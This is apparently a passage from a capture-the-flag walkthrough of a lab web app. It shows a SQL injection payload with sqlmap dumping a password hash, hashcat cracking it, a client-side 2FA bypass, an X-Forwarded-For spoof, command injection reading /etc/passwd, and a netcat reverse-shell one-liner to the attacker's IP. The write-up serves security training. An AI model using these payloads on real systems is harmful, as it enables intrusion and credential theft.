    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test' AND (SELECT 4354 FROM (SELECT(SLEEP(5)))zdLd)-- Ccko
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--
---
[15:49:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[15:49:20] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:49:20] [INFO] fetching current database
[15:49:20] [INFO] resumed: food
[15:49:20] [INFO] fetching entries of column(s) 'password' for table 'auth_user' in database 'food'
[15:49:20] [INFO] fetching number of column(s) 'password' entries for table 'auth_user' in database 'food'
[15:49:20] [INFO] resumed: 2
[15:49:20] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:49:20] [INFO] retrieved: pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=
[15:54:34] [INFO] retrieved: VH6Hj4+eQn5uYGVAxy8Ht7pkVO9oePUpELDdiXFq1M 2
Database: food
Table: auth_user
[2 entries]
+------------------------------------------------------------------------------------------+
| password                                                                                 |
+------------------------------------------------------------------------------------------+
| pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE= |
| VH6Hj4+eQn5uYGVAxy8Ht7pkVO9oePUpELDdiXFq1M 2                                             |
+------------------------------------------------------------------------------------------+

[15:57:16] [INFO] table 'food.auth_user' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.192.246/dump/food/auth_user.csv'
[15:57:16] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 453 times
[15:57:16] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.192.246'
[15:57:16] [WARNING] your sqlmap version is outdated

[*] ending @ 15:57:16 //

https://hashcat.net/forum/thread-9076.html

┌──(witty㉿kali)-[~]
└─$ cat hash_crylo 
pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=

┌──(witty㉿kali)-[~]
└─$ hashcat -m10000 hash_crylo -a0 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 2058/4180 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=:trigger
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
Hash.Target......: pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZA...ZstpE=
Time.Started.....: Sun Aug 13 16:06:08 2023 (1 min, 45 secs)
Time.Estimated...: Sun Aug 13 16:07:53 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       27 H/s (8.79ms) @ Accel:64 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2816/14344385 (0.02%)
Rejected.........: 0/2816 (0.00%)
Restore.Point....: 2560/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259840-259999
Candidate.Engine.: Device Generator
Candidates.#1....: gators -> medicina
Hardware.Mon.#1..: Util: 81%

Started: Sun Aug 13 16:04:26 2023
Stopped: Sun Aug 13 16:07:56 2023

admin:trigger

Enter Your Pin:
```
![[Pasted image 20230813140103.png]]
![[Pasted image 20230813140527.png]]
What is the name of the first username?
*admin*
What is the password for the above user?
Brute-forcing is out of scope.
*trigger*
![[Pasted image 20230813152329.png]]
### Task 3  Encryption
Find a way to bypass the 2FA PIN and login into the application.
Answer the questions below
```text
function submitForm(oFormElement) {
    var xhr = new XMLHttpRequest();
    //xhr.responseType = 'json';
    xhr.onload = function() {
        var encryptedresp = xhr.responseText;
        var k = "8080808080808080";
        var key = CryptoJS.enc.Utf8.parse(k);
        var iv = CryptoJS.enc.Utf8.parse(k);
        var item = encryptedresp;
        var result = CryptoJS.AES.decrypt(item, key,
  {
      keySize: 128 / 4,
      iv: iv,
      mode: CryptoJS.mode.CBC,
      padding: CryptoJS.pad.Pkcs7
  })
        var result = result.toString(CryptoJS.enc.Utf8);
        //////////var jsonResponse = JSON.parse(xhr.responseText);
        var jsonResponse = JSON.parse(result);
        //alert(xhr.responseText);
        //var jsonResponse = xhr.responseText;
        console.log(jsonResponse);
        if (jsonResponse.pin_set == "true") {
            //Redirect to 2fa
            //window.location.replace("/2fa");
            //document.getElementsByClassName
            document.getElementById("loginid").style.display = "none";
            document.getElementById("enterpinid").style.display = "flex";
        } else if (jsonResponse.pin_set == "false") {
            //redirect to set pin
            //window.location.replace("/set-pin");
            document.getElementById("loginid").style.display = "none";
            document.getElementById("createpinid").style.display = "flex";
        } else {
            // Invalid username/ password
            alert(jsonResponse.reason);
        }
    }
    xhr.open(oFormElement.method, oFormElement.action, true);
    xhr.send(new FormData(oFormElement));
    return false;
}

function encrypt() {
    var pass = document.getElementById('pin2').value; {
        //document.getElementById("hide").value = document.getElementById("pin").value;
        var key = "6Le0DgMTAAAAANokdEEial"; //length=22
        var iv = "mHGFxENnZLbienLyANoi.e"; //length=22
        key = CryptoJS.enc.Base64.parse(key);
        iv = CryptoJS.enc.Base64.parse(iv);
        var cipherData = CryptoJS.AES.encrypt(pass, key, {
            iv: iv
        });
        //var data = CryptoJS.AES.decrypt(cipherData, key, { iv: iv });

        //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");
        //var decryptedBytes = CryptoJS.AES.decrypt(Message, "1234567890");
        //var plaintext = decryptedBytes.toString(CryptoJS.enc.Utf8);
        //var hash = CryptoJS.MD5(pass);
        document.getElementById('pin2').value = cipherData;
        return true;
        console.log(document.getElementById('pin2').value)
    }
}

function encrypt2() {
    var pass = document.getElementById('pin3').value; {
        //document.getElementById("hide").value = document.getElementById("pin").value;
        var key = "6Le0DgMTAAAAANokdEEial"; //length=22
        var iv = "mHGFxENnZLbienLyANoi.e"; //length=22
        key = CryptoJS.enc.Base64.parse(key);
        iv = CryptoJS.enc.Base64.parse(iv);
        var cipherData = CryptoJS.AES.encrypt(pass, key, {
            iv: iv
        });
        //var data = CryptoJS.AES.decrypt(cipherData, key, { iv: iv });

        //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");
        //var decryptedBytes = CryptoJS.AES.decrypt(Message, "1234567890");
        //var plaintext = decryptedBytes.toString(CryptoJS.enc.Utf8);
        //var hash = CryptoJS.MD5(pass);
        document.getElementById('pin3').value = cipherData;
        return true;
        console.log(document.getElementById('pin3').value)
    }
}

after we logged we see in console

Object { pin_set: "true", email: "admin@admin.com", success: "true" }

so let's change pin_set to false

debug line 23 (at the time of logging)

  if (jsonResponse.pin_set == "true") {
            //Redirect to 2fa
            //window.location.replace("/2fa");
            //document.getElementsByClassName
            document.getElementById("loginid").style.display = "none";
            document.getElementById("enterpinid").style.display = "flex";
        } else if (jsonResponse.pin_set == "false") {
            //redirect to set pin
            //window.location.replace("/set-pin");
            document.getElementById("loginid").style.display = "none";
            document.getElementById("createpinid").style.display = "flex";
        } else {
            // Invalid username/ password
            alert(jsonResponse.reason);
        }

then in console

allow pasting

jsonResponse = {

"pin_set": "false",

"email": "admin@admin.com",

"success": "true"

}

Object { pin_set: "false", email: "admin@admin.com", success: "true" }

Set Your Pin :

and set a pin u like e.g 1337

and log in again but with the pin u set

Hello, admin
```
![[Pasted image 20230813153547.png]]
![[Pasted image 20230813153626.png]]
Which library is used for encryption and decryption?
*CryptoJS*
Which JSON parameter was used to validate the pin?
*pin_set*
Which encryption method is used?
*AES*
### Task 4  Forbidden Bypass
Look at the response of the forbidden page after login and find a way to bypass it.
Answer the questions below
```text
go to /debug 

The page is for Local Users Only

like harder (using burp)

X-Forwarded-For:127.0.0.1

request: 

GET /debug HTTP/1.1

Host: 10.10.205.91

X-Forwarded-For:127.0.0.1

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cookie: username=admin; password=trigger; csrftoken=ZvCgeGdgx0heHtChpzcLDbo3K9vb8sO69qZFaAnGlhdBVZy9cvVA13vfTMorJNF5; Token=G9e2q6ywEaqk6voNgUYOzFSFlkYYqRUc; sessionid=ji86uvc7azkqlnzyi7terby5rfgqcsvv

Upgrade-Insecure-Requests: 1

response:

HTTP/1.1 200 OK

Server: nginx/1.18.0 (Ubuntu)

Date: Sun, 13 Aug 2023 20:40:27 GMT

Content-Type: text/html; charset=utf-8

Connection: close

X-Frame-Options: DENY

Vary: Cookie

X-Content-Type-Options: nosniff

Referrer-Policy: same-origin

Set-Cookie: csrftoken=ZvCgeGdgx0heHtChpzcLDbo3K9vb8sO69qZFaAnGlhdBVZy9cvVA13vfTMorJNF5; expires=Sun, 11 Aug 2024 20:40:27 GMT; Max-Age=31449600; Path=/; SameSite=Lax

Content-Length: 1173

For Internal Usage
Check for open services

https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html

80 ; cat /etc/passwd 
or
80 & cat /etc/passwd 

and not to forget adding header

X-Forwarded-For:127.0.0.1

http 80/tcp www # WorldWideWeb HTTP domain-s 853/udp # DNS over DTLS [RFC8094] socks 1080/tcp # socks proxy server http-alt 8080/tcp webcache # WWW caching service nbd 10809/tcp # Linux Network Block Device amanda 10080/tcp # amanda backup services canna 5680/tcp # cannaserver zope-ftp 8021/tcp # zope management by ftp tproxy 8081/tcp # Transparent Proxy omniorb 8088/tcp # OmniORB omniorb 8088/udp root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin anof:x:1000:1000:anof:/home/anof:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false crylo:x:1001:1001::/home/crylo:/bin/bash fwupd-refresh:x:114:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```
What extra header can be used to bypass the page?
Check the IP spoof
*X-Forwarded-For*
Which IP is allowed to access the page?
*127.0.0.1*
Exploit the web app to gain access to the machine and submit the flags.
Answer the questions below
```text
revshell

80 ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 1337                                     
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.205.91] 59280
bash: cannot set terminal process group (1185): Inappropriate ioctl for device
bash: no job control in this shell
crylo@crylo:~/Food/food$ id
id
uid=1001(crylo) gid=33(www-data) groups=33(www-data)
crylo@crylo:~/Food/food$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
crylo@crylo:~/Food/food$ cd /home
cd /home
crylo@crylo:/home$ ls
ls
anof  crylo
crylo@crylo:/home$ cd crylo
cd crylo
crylo@crylo:~$ ls
ls
Food  user.txt
crylo@crylo:~$ cat user.txt
cat user.txt
fa3e352b00adf9d4e967ad0e34d5e59d

crylo@crylo:~$ getent passwd | awk -F: '$3>=1000 && $1!="nobody" {print $1}'
getent passwd | awk -F: '$3>=1000 && $1!="nobody" {print $1}'
anof
crylo
crylo@crylo:~$ getent passwd
getent passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
anof:x:1000:1000:anof:/home/anof:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
crylo:x:1001:1001::/home/crylo:/bin/bash
fwupd-refresh:x:114:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
crylo@crylo:~$ getent group sudo
getent group sudo
sudo:x:27:anof

or

crylo@crylo:~$ grep '^sudo:' /etc/group

grep '^sudo:' /etc/group
sudo:x:27:anof

crylo@crylo:~/Food/food$ grep -r encrypt .
grep -r encrypt .
./assets/js/aes.js:            _createHelper: function(e) { return { encrypt: function(b, k, d) { return ("string" == typeof k ? c : a).encrypt(e, b, k, d) }, decrypt: function(b, k, d) { return ("string" == typeof k ? c : a).decrypt(e, b, k, d) } } }
./assets/js/aes.js:            b.encryptBlock(e, a);
./assets/js/aes.js:            encrypt: function(a, b, c, d) {
./assets/js/aes.js:            encrypt: function(b, c, d, l) {
./assets/js/aes.js:                b = a.encrypt.call(this, b, c, d.key, l);
./assets/js/aes.js:            encryptBlock: function(a, b) { this._doCryptBlock(a, b, this._keySchedule, t, r, w, v, l) },
Binary file ./accounts/__pycache__/views.cpython-38.pyc matches
Binary file ./accounts/__pycache__/views.cpython-37.pyc matches
./accounts/enc.py:# ciphertext = cipher.encrypt(padded_data)
./accounts/enc.py:# encryptor = AES.new(key, mode, iv)
./accounts/enc.py:# cipher = encryptor.encrypt(pad_text)
./accounts/enc.py:# cipher_text = e.encrypt(padded_text.encode())
./accounts/enc.py:ct = cipher1.encrypt(pad(data, 16))
./accounts/views.py:                cipher_text = e.encrypt(padded_text1.encode())
./accounts/views.py:                cipher_text = e.encrypt(padded_text1.encode())
./accounts/views.py:            cipher_text = e.encrypt(padded_text1.encode())
./accounts/views.py:        ciphertext = cipher.encrypt(padded_data)
./accounts/views.py:        ciphertext = cipher.encrypt(padded_data)
./templates/set-pin.html:        function encrypt() {
./templates/set-pin.html:                var cipherData = CryptoJS.AES.encrypt(pass, key, {
./templates/set-pin.html:                //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");

crylo@crylo:~/Food/food$ ls
ls
accounts  assets  food  manage.py  media  nano  __pycache__  static  templates
crylo@crylo:~/Food/food$ cd accounts
cd accounts
crylo@crylo:~/Food/food/accounts$ ls
ls
